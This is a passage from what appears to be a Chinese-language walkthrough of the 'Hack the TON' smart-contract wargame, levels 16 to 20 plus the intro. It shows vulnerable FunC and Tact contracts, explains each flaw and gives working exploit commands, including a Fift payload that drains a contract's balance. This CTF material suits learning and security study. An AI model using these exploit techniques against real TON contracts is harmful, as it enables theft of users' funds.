74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 const OP_UNLOCK = \"op::unlock\"c; // create an opcode from string using the \"c\" prefix, this results in 0xf0fd50bb opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; global ctxSeed: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ctxSeed = ds.loadUint(256); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeBool(ctxLocked) .storeUint(ctxSeed, 256) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"seed\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_UNLOCK) { val guess: int = inMsgBody.loadUint(256); if (ctxSeed == 0) { ctxSeed = random(); } randomSetSeed(ctxSeed); ctxSeed = random(); if (guess == ctxSeed) { ctxLocked = false; } saveData(); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } get seed(): int { loadData(); return ctxSeed; } \u5f53 ctxSeed \u4e0d\u4e3a 0 \u65f6\uff0c\u5c06\u76f4\u63a5\u8bbe\u7f6e seed \u5e76\u83b7\u53d6\u968f\u673a\u6570\u4f5c\u4e3a\u4e0b\u4e00\u4e2a seed 1 2 3 4 5 6 7 8 9 10 11 12 13 if (op == OP_UNLOCK) { val guess: int = inMsgBody.loadUint(256); if (ctxSeed == 0) { ctxSeed = random(); } randomSetSeed(ctxSeed); ctxSeed = random(); if (guess == ctxSeed) { ctxLocked = false; } saveData(); return; } \u53d1\u9001\u4e00\u6761\u6d88\u606f\u521d\u59cb\u5316 seed 1 > await contract . send ( player , beginCell (). storeUint ( 0xf0fd50bb , 32 ). storeUint ( 0 , 256 ). endCell (), toNano ( \"0.01\" )); \u5728\u5df2\u77e5 seed \u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8f85\u52a9\u5408\u7ea6\u83b7\u53d6\u968f\u673a\u7684\u7ed3\u679c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import \"@stdlib/deploy\" ; message Random { prevSeed : Int as uint256 ; target : Address ; } contract Guesser with Deployable { receive ( msg : Random ) { setSeed ( msg . prevSeed ); let guess : Int = nativeRandom (); send ( SendParameters { to : msg . target , value : ton ( \"0.008\" ), mode : SendDefaultMode + SendPayGasSeparately , body : beginCell (). storeUint ( 0xf0fd50bb , 32 ). storeUint ( guess , 256 ). endCell () }); } } References \u00b6 Random number generation nativeRandom 17. TOKEN \u00b6 You will beat this level if you manage to acquire tokens amount equivalent to total token supply. Token 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 import \"@stdlib/tvm-dicts\" const OP_MINT = \"op::mint\"c; // create an opcode from string using the \"c\" prefix, this results in 0xecad15c4 opcode in this case const OP_TRANSFER = \"op::transfer\"c; // create an opcode from string using the \"c\" prefix, this results in 0x3ee943f1 opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxOwner: slice; global ctxBalances: cell; global ctxTotalSupply: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxOwner = ds.loadAddress(); ctxBalances = ds.loadDict(); ctxTotalSupply = ds.loadUint(256); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeSlice(ctxOwner) .storeDict(ctxBalances) .storeUint(ctxTotalSupply, 256) .endCell() ); } fun getBalance(balances: cell, account: slice): int { var (_, value: slice, _, isFound: bool) = balances.prefixDictGet(account.getRemainingBitsCount(), account); if (!isFound) { return 0; } return value.loadUint(256); } fun setBalance(mutate self: cell, account: slice, amount: int): void { // will throw if amount is negative val isSuccess: bool = self.prefixDictSet(account.getRemainingBitsCount(), account, beginCell().storeUint(amount, 256).endCell().beginParse()); assert(isSuccess, 501); } fun mint(balances: cell, to: slice, amount: int): cell { var toBalance: int = getBalance(balances, to); toBalance += amount; balances.setBalance(to, toBalance); return balances; } fun transfer(balances: cell, from: slice, to: slice, amount: int): cell { var fromBalance: int = getBalance(balances, from); var toBalance: int = getBalance(balances, to); fromBalance -= amount; toBalance += amount; assert(fromBalance > 0, 502); balances.setBalance(from, fromBalance); balances.setBalance(to, toBalance); return balances; } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"token\").endCell()) .storeBool(getBalance(ctxBalances, ctxPlayer) == ctxTotalSupply) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_MINT) { assert(isSliceBitsEqual(senderAddress, ctxOwner), 503); val to: slice = inMsgBody.loadAddress(); val amount: int = inMsgBody.loadInt(256); ctxTotalSupply += amount; ctxBalances = mint(ctxBalances, to, amount); saveData(); return; } if (op == OP_TRANSFER) { val to: slice = inMsgBody.loadAddress(); val amount: int = inMsgBody.loadInt(256); ctxBalances = transfer(ctxBalances, senderAddress, to, amount); saveData(); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get owner(): slice { loadData(); return ctxOwner; } get balanceOf(account: slice): int { loadData(); return getBalance(ctxBalances, account); } get totalSupply(): int { loadData(); return ctxTotalSupply; } \u9700\u8981\u8ba9\u4ee3\u5e01\u4f59\u989d\u4e0e\u603b\u4f9b\u5e94\u91cf\u76f8\u540c 1 2 3 4 5 6 // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"token\").endCell()) .storeBool(getBalance(ctxBalances, ctxPlayer) == ctxTotalSupply) .endCell(); \u83b7\u53d6\u521d\u59cb\u6570\u636e 1 2 3 4 > await contract . getTotalSupply (); 1000000n > await contract . getBalanceOf ( player . address ); 0n \u521d\u59cb\u4ee3\u5e01\u4f59\u989d\u4e3a 0\u3002\u64cd\u4f5c OP_TRANSFER \u4f7f\u7528 loadInt() \u89e3\u6790\u8981\u8f6c\u79fb\u7684\u4ee3\u5e01\u6570\u91cf\uff0c\u5373 amount \u53ef\u4ee5\u4e3a\u8d1f\u6570\uff0c\u80fd\u591f\u589e\u52a0\u53d1\u9001\u8005\u7684\u4ee3\u5e01\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if (op == OP_TRANSFER) { val to: slice = inMsgBody.loadAddress(); val amount: int = inMsgBody.loadInt(256); ctxBalances = transfer(ctxBalances, senderAddress, to, amount); saveData(); return; } fun transfer(balances: cell, from: slice, to: slice, amount: int): cell { // ... fromBalance -= amount; toBalance += amount; assert(fromBalance > 0, 502); // ... } \u8fdb\u884c\u4ee3\u5e01\u8f6c\u79fb 1 > await contract . send ( player , beginCell (). storeUint ( 0x3ee943f1 , 32 ). storeAddress ( contract . address ). storeInt ( - 1000000n , 256 ). endCell (), toNano ( \"0.02\" )); 18. JACKPOT \u00b6 You will beat this level if you manage to reduce its balance to 0. Jackpot 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 #include \"../imports/stdlib.fc\" ; ;; storage variables global slice ctx_player ; global int ctx_nonce ; global cell ctx_balances ; ;; load_data populates storage variables using stored data () load_data () impure { var ds = get_data (). begin_parse (); ctx_player = ds ~ load_msg_addr (); ctx_nonce = ds ~ load_uint ( 32 ); ctx_balances = ds ~ load_dict (); ds . end_parse (); } ;; save_data stores storage variables as a cell into persistent storage () save_data () impure { set_data ( begin_cell () . store_slice ( ctx_player ) . store_uint ( ctx_nonce , 32 ) . store_dict ( ctx_balances ) . end_cell () ); } ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts () recv_internal ( int my_balance , int msg_value , cell in_msg_full , slice in_msg_body ) impure { if ( in_msg_body . slice_empty ? ()) { ;; ignore all empty messages return (); } slice cs = in_msg_full . begin_parse (); int flags = cs ~ load_uint ( 4 ); if ( flags & 1 ) { ;; ignore all bounced messages return (); } slice sender_address = cs ~ load_msg_addr (); ( int wc , int sender ) = parse_std_addr ( sender_address ); throw_unless ( 501 , wc == 0 ); load_data (); ;; here we populate the storage variables int op = in_msg_body ~ load_uint ( 32 ); ;; by convention , the first 32 bits of incoming message is the op if ( equal_slice_bits ( in_msg_body , \"check\" )) { ;; receive \"check\" message ;; send CheckLevelResult msg cell msg_body = begin_cell () . store_uint ( 0x6df37b4d , 32 ) . store_ref ( begin_cell (). store_slice ( \"jackpot\" ). end_cell ()) . store_int ( my_balance - msg_value == 0 , 1 ) . end_cell (); builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( 0 ) . store_uint ( 1 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . store_ref ( msg_body ); ;; send all the remaining value send_raw_message ( msg . end_cell (), 64 ); return (); } if ( op == 0 ) { ;; deposit int fee = 10000000 ; int balance = max ( msg_value - fee , 0 ); ( _ , slice old_balance_slice , int found ? ) = ctx_balances . udict_delete_get ? ( 256 , sender ); if ( found ? ) { balance += old_balance_slice ~ load_coins (); } ctx_balances ~ udict_set_builder ( 256 , sender , begin_cell (). store_coins ( balance )); save_data (); return (); } if ( op == 1 ) { ;; withdraw ( _ , slice old_balance_slice , int found ? ) = ctx_balances . udict_delete_get ? ( 256 , sender ); throw_unless ( 502 , found ? ); int balance = old_balance_slice ~ load_coins (); int withdraw_amount = in_msg_body ~ load_coins (); throw_unless ( 503 , balance >= withdraw_amount ); balance -= withdraw_amount ; if ( balance > 0 ) { ctx_balances ~ udict_set_builder ( 256 , sender , begin_cell (). store_coins ( balance )); } var msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( withdraw_amount ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . end_cell (); send_raw_message ( msg , 64 + 2 ); save_data (); return (); } throw ( 0xffff ); ;; if the message contains an op that is not known to this contract , we throw } ;; get methods are a means to conveniently read contract data using , for example , HTTP APIs ;; they are marked with method_id ;; note that unlike in many other smart contract VMs , get methods cannot be called by other contracts int balance_of ( slice account_address ) method_id { load_data (); ( _ , int account ) = parse_std_addr ( account_address ); ( slice value , int found ? ) = ctx_balances . udict_get ? ( 256 , account ); ifnot ( found ? ) { return 0 ; } return value ~ load_coins (); } int balance () method_id { [ int value , _ ] = get_balance (); return value ; } \u64cd\u4f5c withdraw \u4f7f\u7528\u4e86\u975e\u4fee\u6539\u65b9\u6cd5 udict_delete_get? \u83b7\u53d6\u4e86\u65e7\u7684\u4f59\u989d\uff0c\u4f46\u4fee\u6539\u540e\u7684\u5b57\u5178\u6ca1\u6709\u8d4b\u503c\u7ed9 ctx_balances \u3002\u5982\u679c withdraw_amount \u6070\u597d\u7b49\u4e8e balance \uff0c ctx_balances \u5c06\u4e0d\u4f1a\u88ab\u66f4\u65b0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 if ( op == 1 ) { ;; withdraw ( _ , slice old_balance_slice , int found ? ) = ctx_balances . udict_delete_get ? ( 256 , sender ); throw_unless ( 502 , found ? ); int balance = old_balance_slice ~ load_coins (); int withdraw_amount = in_msg_body ~ load_coins (); throw_unless ( 503 , balance >= withdraw_amount ); balance -= withdraw_amount ; if ( balance > 0 ) { ctx_balances ~ udict_set_builder ( 256 , sender , begin_cell (). store_coins ( balance )); } ;; [...] save_data (); return (); } \u53ef\u4ee5\u5728\u4e00\u6b21 deposit \u4e4b\u540e\uff0c\u8fdb\u884c\u591a\u6b21 withdraw 1 2 3 4 5 6 7 8 9 10 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). endCell (), toNano ( \"0.05\" )); > await contract . getBalanceOf ( player . address ); 40000000n > await contract . send ( player , beginCell (). storeUint ( 1 , 32 ). storeCoins ( 40000000n ). endCell (), toNano ( \"0.05\" )); // \u6839\u636e\u5408\u7ea6\u4f59\u989d\u51b3\u5b9a\u63a5\u4e0b\u6765\u7684 withdraw_amount > await contract . getBalance (); 1423502n > await contract . send ( player , beginCell (). storeUint ( 1 , 32 ). storeCoins ( 1423482n ). endCell (), toNano ( \"0.05\" )); // \u9700\u8981\u7559\u4e00\u90e8\u5206\u5408\u7ea6\u4f59\u989d\u7528\u4e8e\u4ea4 storage fee\uff0c\u5426\u5219\u8f6c\u51fa\u6d88\u606f\u4f1a\u53d1\u9001\u5931\u8d25 // https://testnet.tonviewer.com/transaction/f422227642e7cb91d4e730df9324b83905e724f19c6488d009480bbd0fde66b0 19. PROXY \u00b6 You will beat this level if you manage to disable this proxy contract. Proxy 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxOwner: slice; global ctxEnabled: bool; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxOwner = ds.loadAddress(); ctxEnabled = ds.loadBool(); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeSlice(ctxOwner) .storeBool(ctxEnabled) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); cs.skipBits(4); val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"proxy\").endCell()) .storeBool(!ctxEnabled) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == 0) { assert(ctxEnabled, 501); val targetAddress: slice = inMsgBody.loadAddress(); val msgBody: cell = inMsgBody.loadRef(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(targetAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); } else { assert(isSliceBitsEqual(senderAddress, ctxOwner), 502); ctxEnabled = inMsgBody.loadBool(); saveData(); } } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get owner(): slice { loadData(); return ctxOwner; } get enabled(): bool { loadData(); return ctxEnabled; } \u9898\u76ee\u8981\u6c42\u5c06 ctxEnabled \u8bbe\u7f6e\u4e3a false \uff0c\u4f46\u53ea\u6709\u5408\u7ea6\u6240\u6709\u8005\u80fd\u591f\u8bbe\u7f6e\uff0c\u800c\u6240\u6709\u8005\u4e3a\u96f6\u5730\u5740 1 2 > ( await contract . getOwner ()). toString (); EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c \u5728 ctxEnabled \u4e3a true \u65f6\uff0c\u64cd\u4f5c 0 \u53ef\u4ee5\u5411\u4efb\u610f\u5730\u5740\u53d1\u9001\u4efb\u610f\u6d88\u606f\uff0c\u53ef\u4ee5\u7528\u4e8e\u76f4\u63a5\u53d1\u9001 check \u6d88\u606f \u53ef\u4ee5\u5148\u6267\u884c\u4e00\u6b21 CHECK SOLUTION \uff0c\u4ee5\u786e\u5b9a \u76ee\u6807\u5730\u5740 \u53d1\u9001 check \u6d88\u606f 1 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). storeAddress ( Address . parse ( \"kQDL370ftqHMY7NcopQb2H9fs7AjkqepO9nPtJXdLSmx6Bvw\" )). storeRef ( beginCell (). storeUint ( 0x6df37b4d , 32 ). storeRef ( beginCell (). storeStringTail ( \"proxy\" ). endCell ()). storeUint ( 1 , 1 ). endCell ()). endCell (), toNano ( \"0.05\" )); \u53e6\u5916\uff0c\u7531\u4e8e onInternalMessage() \u6ca1\u6709\u68c0\u67e5\u6536\u5230\u7684\u6d88\u606f\u662f\u5426\u662f\u5f39\u56de\u6d88\u606f\uff0c\u4e5f\u53ef\u4ee5\u5411\u96f6\u5730\u5740\u53d1\u9001\u6d88\u606f\uff0c\u5e76\u501f\u52a9\u5f39\u56de\u6d88\u606f\u8bbe\u7f6e ctxEnabled 1 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). storeAddress ( await contract . getOwner ()). storeRef ( beginCell (). storeUint ( 1 , 32 ). endCell ()). endCell (), toNano ( \"0.05\" )); References \u00b6 Transfer With a Comment 20. EXECUTION \u00b6 You will beat this level if you manage to reduce its balance to 0. Execution 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 import \"@stdlib/tvm-lowlevel\" // storage variables global ctxPlayer: slice; global ctxNonce: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .endCell() ); } // this asm actually do nothing on TVM level, but force compiler to think that // typeless continuation is actually () to int function @pure fun castToFunction(c: continuation): (() -> int) asm \"NOP\"; // put cell to c5 (we need it to clean register) fun setC5(c: cell): void asm \"c5 POPCTR\"; // this asm gets function as an argument // then it passes it to \"wrapper\" and execute wrapper with \"1 1 CALLXARGS\" // that means move to wrapper stack 1 element and then return 1 element. // wrapper itself try to execute function but catches exceptions, also it checks that // after execution there is at least 1 element on stack via `DEPTH 2 THROWIFNOT`. // if function didn't throw, wrapper returns it's result, otherwise it returns NULL from CATCH statement @pure fun tryExecute(guesser: (() -> int)): int asm \"<{ TRY:<{ EXECUTE DEPTH 2 THROWIFNOT }>CATCH<{ 2DROP NULL }> }>CONT\" \"1 1 CALLXARGS\"; // we do not trust function which we test: it may try to send messages or do other nasty things // so we wrap it to the function which save register values prior to execution // and restores them after @inline fun safeExecute(guesser: (() -> int)): int { val c4: cell = getContractData(); val result: int = tryExecute(guesser); // restore c4 if guesser spoiled it setContractData(c4); // clean actions if guesser spoiled them setC5(beginCell().endCell()); return result; } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"execution\").endCell()) .storeBool(myBalance - msgValue == 0) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == 0) { val code: cell = inMsgBody.loadRef(); val guesser = castToFunction(code.beginParse().transformSliceToContinuation()); randomizeByLogicalTime(); val randomNumber: int = random(); val guess: int = safeExecute(guesser); assert(randomNumber == guess, 501); val msg = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1) .endCell(); // send all the contract balance sendRawMessage(msg, 128); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } get balance(): int { val [value, _] = getMyOriginalBalanceWithExtraCurrencies(); return value; } \u901a\u8fc7\u64cd\u4f5c 0 \u4e2d\u7684\u68c0\u67e5\u5373\u80fd\u6e05\u7a7a\u5408\u7ea6\u6240\u6301\u6709\u7684 TON \u64cd\u4f5c 0 \u80fd\u591f\u5c06\u53d1\u9001\u8005\u63d0\u4f9b\u7684\u4ee3\u7801\u4f5c\u4e3a\u65e0\u8f93\u5165\u8fd4\u56de\u503c\u7c7b\u578b\u4e3a int \u7684\u51fd\u6570\u6267\u884c\uff0c\u4e14\u8981\u6ee1\u8db3\u8fd4\u56de\u503c\u4e0e randomNumber \u76f8\u540c \u4f46\u662f\u64cd\u4f5c 0 \u5df2\u7ecf\u8c03\u7528\u4e00\u6b21 randomizeByLogicalTime() \u968f\u673a\u5316\u4e86\u79cd\u5b50\uff0c\u56e0\u800c\u65e0\u6cd5\u901a\u8fc7\u6267\u884c\u76f8\u540c\u7684\u4ee3\u7801\u6765\u83b7\u53d6\u76f8\u540c\u7684\u968f\u673a\u6570\u3002\u4e0d\u8fc7\uff0c\u5c3d\u7ba1 safeExecute() \u5728\u8c03\u7528\u5b8c tryExecute() \u540e\u4f1a\u91cd\u7f6e\u5bc4\u5b58\u5668 c4 \u548c c5 \uff0c\u4f46\u7531\u4e8e\u6ca1\u6709 commit \uff0c\u540e\u7eed\u6267\u884c\u5982\u679c\u629b\u51fa\u9519\u8bef\uff0c\u4fee\u6539\u5c06\u4f1a\u88ab\u56de\u6eda\u3002\u56e0\u6b64\uff0c\u7528\u6237\u81ea\u5b9a\u4e49\u7684 guesser() \u51fd\u6570\u5b9e\u9645\u4e0a\u53ef\u4ee5\u76f4\u63a5\u53d1\u9001\u6a21\u5f0f\u4e3a 128 \u7684\u6d88\u606f\uff0c\u5e76\u8c03\u7528 commit() \u63d0\u4ea4\u5f53\u524d c4 \u3001 c5 \u5bc4\u5b58\u5668\u7684\u72b6\u6001\u5373\u53ef 1 2 3 4 5 6 7 8 9 10 \"Asm.fif\" include \"TonUtil.fif\" include <{ <b 0x18 6 u, \"0QAHpxVbUO9IXraTMeTmqWNFenGg00qWDnTjhyR0HdsnsCrL\" $>smca 2drop Addr, 0 Gram, 0 107 u, b> // \u6784\u5efa\u6d88\u606f\u4f53 PUSHREF 128 PUSHINT SENDRAWMSG COMMIT 1 PUSHINT // \u4f5c\u4e3a\u8fd4\u56de\u503c }>s s>c boc>B Bx. // \u8f93\u51fa\u7ed3\u679c \u7f16\u8bd1\u4ee3\u7801 1 $ fift func.fif -I libs/ \u53d1\u9001\u4ea4\u6613 1 > await contract . send ( player , beginCell (). storeUint ( 0 , 32 ). storeRef ( Cell . fromHex ( \"B5EE9C7201010201003E00011288810080FB00F80F71010060620003D38AADA877A42F5B4998F27354B1A2BD38D069A54B073A71C3923A0EED93D80000000000000000000000000000\" )). endCell (), toNano ( \"0.05\" )); References \u00b6 bless Introduction To Fift Fift deep dive Fift: A Brief Introduction Telegram Open Network Virtual Machine","title":"Hack the TON"},{"location":"wargames/hack_the_ton/#0-introduction","text":"\u53ef\u4ee5\u5728\u63a7\u5236\u53f0\u4e2d\u4f7f\u7528 help() \u67e5\u770b\u53ef\u4ee5\u4f7f\u7528\u7684\u7a0b\u5e8f\u529f\u80fd (index) description fromNano(nano) \"convert nano units to ton\" toNano(ton) \"convert ton units to nano\" contract \"current level contract instance (if created)\" player \"current player (if wallet connected)\" Address.parse(addressString) \"parse Address from string\" tonConnectUI.sendTransaction(tx, options) \"send custom transaction to arbitrary address\" beginCell() \"start building a cell\" \u5728\u8fde\u63a5\u94b1\u5305\u540e\uff0c\u70b9\u51fb GET NEW INSTANCE \u83b7\u53d6\u4e00\u4e2a\u9898\u76ee\u5b9e\u4f8b \u4e0e Ethernaut \u7c7b\u4f3c\uff0c\u53ef\u4ee5\u5728\u63a7\u5236\u53f0\u4f7f\u7528 contract \u83b7\u53d6\u4fe1\u606f\u6216\u4e0e\u5408\u7ea6\u4ea4\u4e92 1 2 3 4 5 6 7 8 9 10 11 12 13 > await contract . getInfo () \u200b You will find what you need in getInfo1 (). > await contract . getInfo1 () \u200b Try getInfo2 (), but with 'hello' as a parameter . \u200b > await contract . getInfo2 ( \"hello\" ) \u200b Try getInfoNum () to know the number of the next info method to call . \u200b > await contract . getInfoNum () \u200b 42n \u200b > await contract . getInfo42 () \u200b Send message Authenticate if you know the password . > await contract . getPassword () \u200b Tact and FunC for the win ! > await contract . send ( player , { value : toNano ( 0.05 )}, { $$type : \"Authenticate\" , password : \"Tact and FunC for the win!\" }); \u5b8c\u6210\u540e\u70b9\u51fb CHECK SOLUTION \u9a8c\u8bc1","title":"0. INTRODUCTION"},{"location":"wargames/hack_the_ton/#references","text":"Send messages to contracts","title":"References"},{"location":"wargames/hack_the_ton/#1-deposit","text":"You will beat this level if: Claim ownership of the contract Reduce its balance to 0 DepositLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 import \"@stdlib/ownable\" ; import \"@stdlib/deploy\" ; import \"./messages\" ; contract DepositLevel with Ownable , Deployable { owner : Address ; player : Address ; nonce : Int ; init ( player : Address , nonce : Int ) { self . owner = sender (); self . player = player ; self . nonce = nonce ; } receive () { require ( context (). value >= ton ( \"0.01\" ), \"Not enough TON.\" ); self . owner = sender (); } receive ( \"withdraw\" ) { self . requireOwner (); send ( SendParameters { to : sender (), bounce : true , value : 0 , mode : SendRemainingBalance + SendIgnoreErrors }); } receive ( \"check\" ) { let ctx : Context = context (); send ( SendParameters { to : ctx . sender , value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"deposit\" , completed : ( myBalance () - ctx . value ) == 0 && self . owner == self . player , }. toCell () }); } get fun balance () : String { return myBalance (). toCoinsString (); } } \u53ea\u6709\u6240\u6709\u8005\u624d\u80fd\u53d6\u51fa\u5408\u7ea6\u6301\u6709\u7684 